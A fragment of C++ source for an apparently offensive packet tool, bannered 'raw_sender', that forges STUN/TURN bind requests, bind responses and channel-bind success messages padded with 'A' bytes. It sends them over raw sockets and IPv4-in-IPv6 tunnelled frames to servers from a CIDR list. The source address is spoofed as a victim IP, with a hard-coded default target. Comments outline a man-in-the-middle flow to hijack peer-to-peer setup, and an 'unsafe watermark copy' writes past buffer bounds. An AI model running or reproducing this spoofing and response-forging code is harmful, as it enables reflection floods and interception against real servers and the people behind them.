	cidr_to_ips(cidr_list, ips);
	char bind_request[512]={};
	size_t total=0,acc_payload=0;
	stun_header* h = (stun_header*)&bind_request[0];
	//banner: [raw_sender]
	const std::string banner = R"( 
,--.--. ,--,--.,--.   ,--. 
|  .--'' ,-.  ||  |.'.|  | 
|  |   \ '-'  ||   .'.   | 
`--'    `--`--''--'   '--' 
)"; 
	//flash banner in red font color 
	std::cout << "\033[1;31m"; 
	//set blinking text
	std::cout << "\033[5m";


	//print banner
	std::cout << banner << std::endl;
	//reset font color
	std::cout << "\033[0m";
	//reset blinking text
	std::cout << "\033[25m";

	//print usage gray text

	
	std::cout  <<"\033[1;30m" << "Usage: " << argv[0] << " <target> <connection_name> <target6>" << std::endl; 

	//reset font color
	std::cout << "\033[0m";


	char *ptr = &bind_request[0],*buf=ptr;

	const size_t attrib_size = sizeof(stun_attribute)-1;


	acc_payload= sizeof(stun_header)+8+MOD4(0x20)+(attrib_size*4);
	
	h->msg_len = htons(8+MOD4(0x20)+(attrib_size*4));


	h->msg_type = htons(BindRequest);

	gen_random_string((char*) &h->magicCookieAndTid, 16);
	h->id.magicCookie = htonl(0x2112a442);
	stun_attribute* p_attr = (stun_attribute*) &bind_request[sizeof(stun_header)] ;
	
	
	p_attr->attribute_type = htons(0x802a) ;//ICE-CONTROLLING
	p_attr->size = htons(8);
	gen_random_string((char*)&p_attr->offset,8);

	p_attr =(stun_attribute*) (((char*)&p_attr->offset)+8);
	p_attr->attribute_type = htons(0x0025); //USE-CANDIDATE
	p_attr->size=htons(0);

	p_attr =(stun_attribute*)(&p_attr->offset) ;// &bind_request[sizeof(stun_header)+(attrib_size*2)+8];//pad

	p_attr->attribute_type = htons(0x0024); //PRIORITY
	p_attr->size=htons(4);
	p_attr->offset = random_port(); //just first byte . 
	p_attr =(stun_attribute*) (((char*)&p_attr->offset)+4);


	memset(p_attr,0x41,0x20);//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	p_attr->attribute_type=htons(0x0013);//STUN/TURN DATA INDICATION
	p_attr->size=htons(0x20);//32 bytes 
	
	//validate argument before assignment , default values are used. 
	//
	// server address - default target is 13.58.64.27
	// connection name - default connection name is wlo1 
	// target6 - default target6 is nullptr 
	//

	const char *target = argc>1?argv[1]:"13.58.64.27";

	const char* connection_name = argc>2?argv[2]:"wlo1" ;
	
	const char* target6_name = argc>3?argv[3]:nullptr;

	//validate argument before assignment. 
	//set green text color
	std::cout << "\033[1;32m";

	std::cout << "[+]Target: " << target << std::endl;
	std::cout << "[+]Connection Name: " << connection_name << std::endl;
 	if(target6_name!=nullptr) std::cout << "[+]Target6: " << target6_name << std::endl;
	else std::cout << "[+]Target6: " << "NULL, this will take some time..." << std::endl;

	std::cout<<"[+]Total Servers: "<<ips.size()<<std::endl;	 

	//set cyan text color
	std::cout << "\033[1;36m";

	for (size_t i = 0; i < ips.size(); i++) {
		const char* address = ips[i].c_str();
		
		for (size_t i = 0; i < NUM_OF_PACKETS_PER_SERVER; ++i) {
			// send bind request from target argv[1];
			//
			//
			//
			//unsafe watermark copy
			char* buffer = (char*)&p_attr->offset;
			buffer[strlen(address)]='@';
			memcpy(buffer,address,strlen(address)-1);
			//send bind request to target server
			if(send_raw4_over_6(bind_request,acc_payload,target,address,target,connection_name,target6_name)>0) total++;
			//A MITM FLOW CAN BE IMPLEMENTED HERE 
			//sending a successful response to the target server 
			//and then sending the assumed response to the target6 server to initiate p2p connection. 
			//duplicate the assumed response to the target6 server to initiate p2p connection. 
			
			//send bind response to target server
			stun_header* response = (stun_header*)bind_request;

			response->msg_type = htons(BindResponse);
			response->msg_len = htons(8+MOD4(0x20)+(attrib_size*4));
			response->id.magicCookie = htonl(0x2112a442);
			response->id.tid = h->id.tid;
			response->magicCookieAndTid = h->magicCookieAndTid;
			response->msg_len = h->msg_len;
			response->msg_type = /*BindResponse*/htons(0x0101);
			//send bind response to target server
			if(send_raw4_over_6(bind_request,acc_payload,target,address,target,connection_name,target6_name)>0)
				total++;
			//channel binding:
			
			response->msg_len = htons(8+MOD4(0x20)+(attrib_size*4));
			response->id.magicCookie = htonl(0x2112a442);
			response->id.tid = h->id.tid;
			response->magicCookieAndTid = h->magicCookieAndTid;
			response->msg_len = h->msg_len;
			response->msg_type = /*ChannelBindSuccessResponse*/htons(0x0102);
			//send channel bind success response to target server
			if(send_raw4_over_6(bind_request,acc_payload,target,address,target,connection_name,target6_name)>0)
				total++;

 
			//duplicate the assumed response to the target6 server to initiate p2p connection. 

 			if(send_raw4(bind_request, acc_payload, target, address, target,
					connection_name)>0)
			
				total++;
		}
	}
	//reset font color
	std::cout << "\033[0m";
	printf("\n====\ttotal sent:%lu\t servers :%lu\n ",total,ips.size());
 
	return 0;


}



int get_interface_index(const char *interface, struct ifreq &fifr) {
	static struct ifreq ifr;
	static bool got_ifreq = false;
	memset(&ifr, 0, sizeof(ifr));
	int sd;
	if (!got_ifreq) {
		if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
			perror(
					"socket() failed to get socket descriptor for using ioctl() ");
			exit(EXIT_FAILURE);
		}
		snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
		if (ioctl(sd, SIOCGIFINDEX, &ifr) < 0) {
			perror("ioctl() failed to find interface ");
			return (EXIT_FAILURE);
		}
		close(sd);
		//if we got thus far :
		got_ifreq = true;
	}
	memcpy(&fifr, &ifr, sizeof(struct ifreq));
	return ifr.ifr_ifindex;
}
static void *
find_ancillary (struct msghdr *msg, int cmsg_type)
{
  struct cmsghdr *cmsg = NULL;

  for (cmsg = CMSG_FIRSTHDR (msg); cmsg != NULL; cmsg = CMSG_NXTHDR (msg, cmsg)) {
    if ((cmsg->cmsg_level == IPPROTO_IPV6) && (cmsg->cmsg_type == cmsg_type)) {
      return (CMSG_DATA (cmsg));
    }
  }

  return (NULL);
}
typedef struct _pktinfo6 pktinfo6;
struct _pktinfo6 {
  struct in6_addr ipi6_addr;
  int ipi6_ifindex;
  };

uint8_t *
ra_mac( const char* interface)
{
  int i, status, sd, on, ifindex, hoplimit;
  struct nd_router_advert *ra;
  //uint8_t *inpack;
  static uint8_t dst_mac[8]; 
  static uint8_t inpack[IP_MAXPACKET],ctrl[IP_MAXPACKET];
  int len;
  struct msghdr msghdr;
  struct iovec iov[2];
  uint8_t  *pkt;
  void * opt;
  char destination[INET6_ADDRSTRLEN];
  struct in6_addr dst;
  int rcv_ifindex;
  struct ifreq ifr;





  // Prepare msghdr for recvmsg().
  memset (&msghdr, 0, sizeof (msghdr));
  msghdr.msg_name = NULL;
  msghdr.msg_namelen = 0;
  memset (&iov, 0, sizeof (iov));
  iov[0].iov_base = (uint8_t *) inpack;
  iov[0].iov_len = IP_MAXPACKET;
  msghdr.msg_iov = iov;
  msghdr.msg_iovlen = 1;

  msghdr.msg_control = ctrl;
  msghdr.msg_controllen = IP_MAXPACKET * sizeof (uint8_t);

  // Request a socket descriptor sd.
  if ((sd = socket (AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)) < 0) {
    perror ("Failed to get socket descriptor ");
    exit (EXIT_FAILURE);
    }

  // Set flag so we receive hop limit from recvmsg.
  on = 1;
  if ((status = setsockopt (sd, IPPROTO_IPV6, IPV6_RECVHOPLIMIT, &on, sizeof (on))) < 0) {
    perror ("setsockopt to IPV6_RECVHOPLIMIT failed ");
    exit (EXIT_FAILURE);
    }

  // Set flag so we receive destination address from recvmsg.
  on = 1;
  if ((status = setsockopt (sd, IPPROTO_IPV6, IPV6_RECVPKTINFO, &on, sizeof (on))) < 0) {
    perror ("setsockopt to IPV6_RECVPKTINFO failed ");
    exit (EXIT_FAILURE);
    }

  //printf("Interface: %s\n",interface);

  // Obtain MAC address of this node.
  memset (&ifr, 0, sizeof (ifr));
  snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
  if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
    perror ("ioctl() failed to get source MAC address ");
    exit (EXIT_FAILURE);
  }

  // Retrieve interface index of this node.
  if ((ifindex = if_nametoindex (interface)) == 0) {
    perror ("if_nametoindex() failed to obtain interface index ");
    exit (EXIT_FAILURE);
    }
  // printf ("\nOn this node, index for interface %s is %i\n", interface, ifindex);

  // Bind socket to interface of this node.
  if (setsockopt (sd, SOL_SOCKET, SO_BINDTODEVICE, (void *) &ifr, sizeof (ifr)) < 0) {
    perror ("SO_BINDTODEVICE failed");
    exit (EXIT_FAILURE);
  }

  // Listen for incoming message from socket sd.
  // Keep at it until we get a router advertisement.
  ra = (struct nd_router_advert *) inpack;
  while (ra->nd_ra_hdr.icmp6_type != ND_ROUTER_ADVERT) {
    if ((len = recvmsg (sd, &msghdr, 0)) < 0) {
      perror ("recvmsg failed ");
      exit (EXIT_FAILURE);
    }
  }

  // Ancillary data
  // printf ("\nIPv6 header data:\n");
  opt = find_ancillary ((struct msghdr*)&msghdr, IPV6_HOPLIMIT);
  if (opt == NULL) {
    fprintf (stderr, "Unknown hop limit\n");
    exit (EXIT_FAILURE);
  }
  hoplimit = *(int *) opt;
  // printf ("Hop limit: %i\n", hoplimit);

  opt = find_ancillary ((struct msghdr*)&msghdr, IPV6_PKTINFO);
  if (opt == NULL) {
    fprintf (stderr, "Unkown destination address\n");
    exit (EXIT_FAILURE);
    }
  memset (&dst, 0xFF, sizeof (dst));
  dst = ((pktinfo6 *) opt)->ipi6_addr;
  if (inet_ntop (AF_INET6, &dst, destination, INET6_ADDRSTRLEN) == NULL) {
    status = errno;
    fprintf (stderr, "inet_ntop() failed.\nError message: %s", strerror (status));
    exit (EXIT_FAILURE);
    }
  //printf ("Destination address: %s\n", destination);

  rcv_ifindex = ((pktinfo6 *) opt)->ipi6_ifindex;
  //printf ("Destination interface index: %i\n", rcv_ifindex);

  // ICMPv6 header and options data
  // printf ("\nICMPv6 header data:\n");
   printf ("[+]Type (134 = router advertisement): %u\n", ra->nd_ra_hdr.icmp6_type);
   printf ("[+]Code: %u\n", ra->nd_ra_hdr.icmp6_code);
  // printf ("Checksum: %x\n", ntohs (ra->nd_ra_hdr.icmp6_cksum));
  // printf ("Hop limit recommended by this router (0 is no recommendation): %u\n", ra->nd_ra_curhoplimit);
  // printf ("Managed address configuration flag: %u\n", ra->nd_ra_flags_reserved >> 7);
  // printf ("Other stateful configuration flag: %u\n", (ra->nd_ra_flags_reserved >> 6) & 1);
  // printf ("Mobile home agent flag: %u\n", (ra->nd_ra_flags_reserved >> 5) & 1);
  // printf ("Router lifetime as default router (s): %u\n", ntohs (ra->nd_ra_router_lifetime));
  // printf ("Reachable time (ms): %u\n", ntohl (ra->nd_ra_reachable));
  // printf ("Retransmission time (ms): %u\n", ntohl (ra->nd_ra_retransmit));

  // printf ("\nOptions:\n");  // Contents here are consistent with ra6.c, but others are possible

  pkt = (uint8_t *) inpack;  

  // printf ("Type: %u\n", pkt[sizeof (struct nd_router_advert)]);
  // printf ("Length: %u (units of 8 octets)\n", pkt[sizeof (struct nd_router_advert) + 1]);




  if(ICMPTYPE_SIZE(ra->nd_ra_hdr.icmp6_type)==0) {
	  fprintf(stderr,"[-]error type size is unknown \n");
		  exit(-1);
  }


  struct nd_opt_hdr* optptr =(struct nd_opt_hdr*) &pkt[ ICMPTYPE_SIZE(ra->nd_ra_hdr.icmp6_type)+
	 +ETH_HDRLEN+IP6_HDRLEN ] ;
   
  uint8_t* pos = (uint8_t*) optptr;


  struct ether_addr* addr = (struct ether_addr*) &pkt[len-sizeof(ether_addr)];


  printf("[+] copying ether_addr %s\n " , ether_ntoa(addr));
  
  for(i=0;i<6;i++)
	  dst_mac[i]=addr->ether_addr_octet[i];
  close(sd);

  return (&dst_mac[0]);
}

int send_raw6(char *data,size_t datalen,const char*src_ip4,const char* src_ip6,const char*dst_ip,const char* target4,const char* target6,const char* interface) 
{
    int ret = 0, sd = 0, on = 1,status=0;
    static char buffer[1024];
    struct ifreq ifr;
    static uint8_t src_mac[6]={}, dst_mac[6]={};//no need to query those each time.
    uint8_t ether_frame[IP_MAXPACKET];
    struct sockaddr_in6* ipv6=NULL;
    struct addrinfo hints, *res;
    void *tmp;
    struct ip ip4hdr;
    struct ip6_hdr ip6hdr;
    int ip4_flags[4];
    const char* target_ip4=target4;
    struct udphdr udphdr;
    int frame_length,bytes;
    struct sockaddr_ll device;
    char src_ip[20]={};
    static int init=0;

    debug("[+] send_raw 4 over 6 ( datalen= %lu,src_ip4=%s ,src_ip6=%s,dst_ip=%s,target4=%s,target6=%s,interface=%s )\n ",datalen,src_ip4,src_ip6,dst_ip,target4,target6,interface);

    if(init==0) 
    {
	 //#ifndef HAS_IP_6_INTERFACE 
	 //uint8_t* ra = NULL;
	 //#else
         uint8_t * ra = ra_mac(interface);
	 //#endif
	 if(ra) printf (" Got %02x%02x%02x%02x%02x%02x ", ra[0],ra[1],ra[2],ra[3],ra[4],ra[5]) ;

	 for(uint i=0;i<6;++i)dst_mac[i]=0xFF ;

	 if(ra!=NULL)
	     for(uint i=0;i<6;++i)  dst_mac[i]=ra[i];
	 else
	     for(uint i=0;i<6;++i)  dst_mac[i]=0xFF;

         if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) { 
	    perror ("socket() failed to get socket descriptor for using ioctl() "); 
	    exit (EXIT_FAILURE); 
    } 
 
  // Use ioctl() to look up interface name and get its MAC address. 
  memset (&ifr, 0, sizeof (ifr)); 
  snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface); 
  if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) { 
    perror ("ioctl() failed to get source MAC address "); 
    exit (EXIT_FAILURE); 
    } 
  close (sd); 
 

    
    
    // Copy source MAC address.
    memcpy (src_mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
    memset(&ifr,0,sizeof(ifr));


      init++;

    }    

      printf("[+]SRC  MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5] );
      printf("[+]DST  MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", dst_mac[0],dst_mac[1],dst_mac[2],dst_mac[3],dst_mac[4],dst_mac[5] );
   
    // Fill out hints for getaddrinfo().
   memset (&device, 0, sizeof (device));
  if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
    perror ("if_nametoindex() failed to obtain interface index ");
    exit (EXIT_FAILURE);
  }
  debug("[+]Index for interface %s is %i\n", interface, device.sll_ifindex);

/*
    memset (&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_INET6;
    hints.ai_socktype = SOCK_RAW;
    hints.ai_flags = hints.ai_flags | AI_CANONNAME;
      // Resolve source using getaddrinfo().
  if ((status = getaddrinfo (src_ip6, NULL, &hints, &res)) != 0) {
    fprintf (stderr, "getaddrinfo() failed for IPv6 source: %s\n", gai_strerror (status));
    return (EXIT_FAILURE);
  }
  
  ipv6 = (struct sockaddr_in6 *) res->ai_addr;
  tmp = &(ipv6->sin6_addr);
  if (inet_ntop (AF_INET6, tmp, src_ip, INET6_ADDRSTRLEN) == NULL) {
    status = errno;
    fprintf (stderr, "inet_ntop() failed for IPv6 source.\nError message: %s", strerror (status));
    exit (EXIT_FAILURE);
  }
  freeaddrinfo (res);
 */
   // Report source MAC address to stdout.
   debug ("[+]got MAC addresses for interface %s  ", interface);

  // IPv4 header (Section 3.5 of RFC 4213)

  // IPv4 header


  debug("[+] creating ipv4 header\n" );

  // IPv4 header length (4 bits): Number of 32-bit words in header = 5
  ip4hdr.ip_hl = sizeof (struct ip) / sizeof (uint32_t);

  // Internet Protocol version (4 bits): IPv4
  ip4hdr.ip_v = 4;

  // Type of service (8 bits)
  ip4hdr.ip_tos = 0;

  // Total length of datagram (16 bits): IPv4 header + IPv6 header + UDP headder + UDP data
  ip4hdr.ip_len = htons (IP4_HDRLEN +  UDP_HDRLEN + datalen);

  // ID sequence number (16 bits): unused, since single datagram
  ip4hdr.ip_id = htons (0);

  // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram

  // Zero (1 bit)
  ip4_flags[0] = 0;

  // Do not fragment flag (1 bit)
  ip4_flags[1] = 1;

  // More fragments following flag (1 bit)
  ip4_flags[2] = 0;

  // Fragmentation offset (13 bits)
  ip4_flags[3] = 0;

  ip4hdr.ip_off = htons ((ip4_flags[0] << 15)
                       + (ip4_flags[1] << 14)
                       + (ip4_flags[2] << 13)
                        + ip4_flags[3]);

  // Time-to-Live (8 bits): use maximum value
  ip4hdr.ip_ttl = 255;

  // Transport layer protocol (8 bits): 41 for IPv6 (Section 3.5 of RFC 4213)
  //ip4hdr.ip_p = IPPROTO_IPV6;

  ip4hdr.ip_p=IPPROTO_UDP;

  // Source IPv4 address (32 bits)
  if ((status = inet_pton (AF_INET, target4, &(ip4hdr.ip_src))) <0) {
    fprintf (stderr, "[-]inet_pton() failed for IPv4 source address %s.\nError message: %s\n",target4, strerror (status));
//    exit (EXIT_FAILURE);
  }

  // Destination IPv4 address (32 bits)
  if ((status = inet_pton (AF_INET, dst_ip
				  , &(ip4hdr.ip_dst))) <0) {
    fprintf (stderr, "[-]inet_pton() failed for IPv4 destination address %s.\nError message: %s\n",target4, strerror (status));
    exit (EXIT_FAILURE);
  }

  
  debug("[+] finalizing ipv4 header\n" );
  // IPv4 header checksum (16 bits) - set to 0 when calculating checksum
  ip4hdr.ip_sum = 0;
  ip4hdr.ip_sum = checksum ((uint16_t *) &ip4hdr, IP4_HDRLEN);

  // IPv6 header
 


  debug("[+] starting IP6 header\n");
  // IPv6 version (4 bits), Traffic class (8 bits), Flow label (20 bits)
  ip6hdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);

  // Payload length (16 bits)
  ip6hdr.ip6_plen = ip4hdr.ip_len;


  // Next header (8 bits) - 17 for UDP
  ip6hdr.ip6_nxt = IPPROTO_IPIP;//..random_port();////random_port()%2==0? IPPROTO_IPIP:random_port();//   IPPROTO_FRAGMENT;//let's have fun

  // Hop limit  (8 bits) - use 255 (RFC 4861)
  ip6hdr.ip6_hops = 255;

  ip4hdr.ip_p = IPPROTO_UDP;
  
  //ip4hdr.ip_sum = checksum ((uint16_t *) &ip4hdr, IP4_HDRLEN);
  
  debug("[+] calling inet_pton with IP6 src %s\n",src_ip6);


  // Source IPv6 address (128 bits)
  if ((status = inet_pton (AF_INET6, src_ip6, &(ip6hdr.ip6_src))) <0) {
    fprintf (stderr, "inet_pton() failed for IPv6 source address %s.\nError message: %s",src_ip6, strerror (status));
    exit (EXIT_FAILURE);
  }

  debug("[+] calling inet_pton with IP6 target %s \n",target6);
  // Destination IPv6 address (128 bits)
  // let's try google
  if ((status = inet_pton (AF_INET6, /*"2607:f8b0:400e:c03::7f"*/target6, &(ip6hdr.ip6_dst))) <0) {
    fprintf (stderr, "inet_pton() failed for IPv6 destination address %s. \nError message: %s",target6, strerror (status));
    exit (EXIT_FAILURE);
  }

  // UDP header
  //
  debug("[+] preparing UDP  headers ...\n");
  // Source port number (16 bits): pick a number
  udphdr.dest = htons (random_port()%2==0?random_port():STUN_DEFAULT_PORT);

  // Destination port number (16 bits): pick a number
  udphdr.source =htons(STUN_DEFAULT_PORT);

  // Length of UDP datagram (16 bits): UDP header + UDP data
  udphdr.len = htons (UDP_HDRLEN + datalen);



  // UDP checksum (16 bits)a
  //
  // not since ip4 packet is parsed before udp, let's do udp_checksum instead of 6
  udphdr.check = udp4_checksum(ip4hdr,udphdr,(uint8_t*)data,datalen);

 // udphdr.check = udp6_checksum (ip6hdr, udphdr,(uint8_t*) data, datalen);

  // Fill out ethernet frame header.

  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (IP4 header + IP6 header + UDP header + UDP data)
  frame_length = 6 + 6 + 2 + IP4_HDRLEN + IP6_HDRLEN + UDP_HDRLEN + datalen;

  // Destination and Source MAC addresses
 
  memcpy (ether_frame, dst_mac, 6 * sizeof (uint8_t));
  memcpy (ether_frame + 6, src_mac, 6 * sizeof (uint8_t));

  // Next is ethernet type code (ETH_P_IP for IPv4).
  // http://www.iana.org/assignments/ethernet-numbers
  ether_frame[12] = ETH_P_IPV6/ 256;
  ether_frame[13] = ETH_P_IPV6 % 256;

  // Next is ethernet frame data (IPv4 header + UDP header + UDP data).

  // IPv6 header
  memcpy (ether_frame + ETH_HDRLEN, &ip6hdr , IP6_HDRLEN * sizeof (uint8_t));

  // IPv4 header
  memcpy (ether_frame + ETH_HDRLEN + IP6_HDRLEN, &ip4hdr, IP4_HDRLEN * sizeof (uint8_t));

  // UDP header
  memcpy (ether_frame + ETH_HDRLEN + IP4_HDRLEN + IP6_HDRLEN, &udphdr, UDP_HDRLEN * sizeof (uint8_t));

  // UDP data
  memcpy (ether_frame + ETH_HDRLEN + IP4_HDRLEN + IP6_HDRLEN + UDP_HDRLEN, data, datalen * sizeof (uint8_t));



  debug("[+] creating raw PF_PACKET socket \n " );
  // Submit request for a raw socket descriptor.
  if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
    perror ("socket() failed ");
    exit (EXIT_FAILURE);
  }
  debug("[+] sending data frames\n");

  // Send ethernet frame to socket.
  //
 

  if ((bytes = sendto (sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
    printf ("sendto() failed, returned %d,%s ",bytes,strerror(bytes));
    exit (EXIT_FAILURE);
  }
  // Close socket.
  close (sd);
  printf("[+] successfully sent %d bytes from ip4ip6 int\n",bytes);
  return bytes;
}
int send_raw4(char *data, size_t datalen, const char *src_ip/*target*/,
		const char *dst_ip/*address*/, const char *target/*target*/, const char *interface) {

	int ret = 0, sd = 0, on = 1;
	int status, ip_flags[4];
	ip iphdr;
	udphdr udphdr;
	uint8_t packet[65355];
	addrinfo hints, *res;
	sockaddr_in ipv4, soin;
	ifreq ifr;
	void *tmp;
	int ifindex = get_interface_index(interface, ifr);
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = hints.ai_flags | AI_CANONNAME;

	char inet_ntop_dst_ip[INET_ADDRSTRLEN];
	strncpy(inet_ntop_dst_ip, dst_ip, INET_ADDRSTRLEN);

	// Resolve target using getaddrinfo().
	if ((status = getaddrinfo(target, NULL, &hints, &res)) != 0) {
		fprintf(stderr, "getaddrinfo() failed: %s\n", gai_strerror(status));
		exit(EXIT_FAILURE);
	}

	ipv4 = (*(struct sockaddr_in*) res->ai_addr);
	tmp = &(ipv4.sin_addr);
	if (inet_ntop(AF_INET, tmp, (char*) &inet_ntop_dst_ip[0],
			INET_ADDRSTRLEN) == NULL) {
		status = errno;
		fprintf(stderr, "inet_ntop() failed.\nError message: %s",
				strerror(status));
		exit(EXIT_FAILURE);
	}
	freeaddrinfo(res);
	// IPv4 header
	iphdr.ip_hl = IP4_HDRLEN / sizeof(uint32_t);
	iphdr.ip_v = 4;
	iphdr.ip_tos = 0;
	iphdr.ip_len = htons(IP4_HDRLEN + UDP_HDRLEN + datalen);
	iphdr.ip_id = htons(0);

	// Zero (1 bit)
	ip_flags[0] = 0;

	// Do not fragment flag (1 bit)
	ip_flags[1] = 1;

	// More fragments following flag (1 bit)
	ip_flags[2] = 0;

	// Fragmentation offset (13 bits)
	ip_flags[3] = 0;
	iphdr.ip_off = htons(
			(ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13)
					+ ip_flags[3]);
	iphdr.ip_ttl = 66;

	// Transport layer protocol (8 bits): 17 for UDP
	iphdr.ip_p = IPPROTO_UDP;
	if ((status = inet_pton(AF_INET, src_ip
					, &(iphdr.ip_src))) != 1) {
		fprintf(stderr, "inet_pton() failed for %s .\nError message: %s",src_ip,
				strerror(status));
		exit(EXIT_FAILURE);
	}
	if ((status = inet_pton(AF_INET, dst_ip, &(iphdr.ip_dst))) != 1) {
		fprintf(stderr, "inet_pton() for %s failed.\nError message: %s",target,
				strerror(status));
		exit(EXIT_FAILURE);
	}
	iphdr.ip_sum = 0;
	iphdr.ip_sum = checksum((uint16_t*) &iphdr, IP4_HDRLEN);
	udphdr.source = htons(random_port());
	udphdr.dest = htons(STUN_DEFAULT_PORT);
	udphdr.len = htons(UDP_HDRLEN + datalen);

	// UDP checksum (16 bits)
	udphdr.check = udp4_checksum(iphdr, udphdr, (uint8_t*) data, datalen);

	// Prepare packet.

	// First part is an IPv4 header.
	memcpy(packet, &iphdr, IP4_HDRLEN * sizeof(uint8_t));

	// Next part of packet is upper layer protocol header.
	memcpy((packet + IP4_HDRLEN), &udphdr, UDP_HDRLEN * sizeof(uint8_t));

	// Finally, add the UDP data.
	memcpy(packet + IP4_HDRLEN + UDP_HDRLEN, data, datalen * sizeof(uint8_t));

	memset(&soin, 0, sizeof(struct sockaddr_in));
	soin.sin_family = AF_INET;
	soin.sin_addr.s_addr = iphdr.ip_dst.s_addr;

	// Submit request for a raw socket descriptor.
	if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("socket() failed ");
		exit(EXIT_FAILURE);
	}

	// Set flag so socket expects us to provide IPv4 header.
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		perror("setsockopt() failed to set IP_HDRINCL ");
		exit(EXIT_FAILURE);
	}

	// Bind socket to interface index.
	if (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
		perror("setsockopt() failed to bind to interface ");
		exit(EXIT_FAILURE);
	}
	ret = sendto(sd, packet, IP4_HDRLEN + UDP_HDRLEN + datalen, 0,
			(struct sockaddr*) &soin, sizeof(struct sockaddr));

	if (ret < 0) {
		perror("sendto() failed ");
		exit(EXIT_FAILURE);
	}
	printf("[+] sent %d bytes to %s from %s \n", ret, target, dst_ip);
	close(sd);
	return datalen;
}

uint16_t checksum(uint16_t *addr, int len) {

	int count = len;
	uint32_t sum = 0;
	uint16_t answer = 0;

	// Sum up 2-byte values until none or only one byte left.
	while (count > 1) {
		sum += *(addr++);
		count -= 2;
	}

	// Add left-over byte, if any.
	if (count > 0) {
		sum += *(uint8_t*) addr;
	}

	// Fold 32-bit sum into 16 bits; we lose information by doing this,
	// increasing the chances of a collision.
	// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	// Checksum is one's compliment of sum.
	answer = ~sum;

	return (answer);
}

//mitm address (ipv4) , target address (ipv4) , target port , interface name 

//mitm address (ipv6) , target address (ipv6) , target port , interface name 

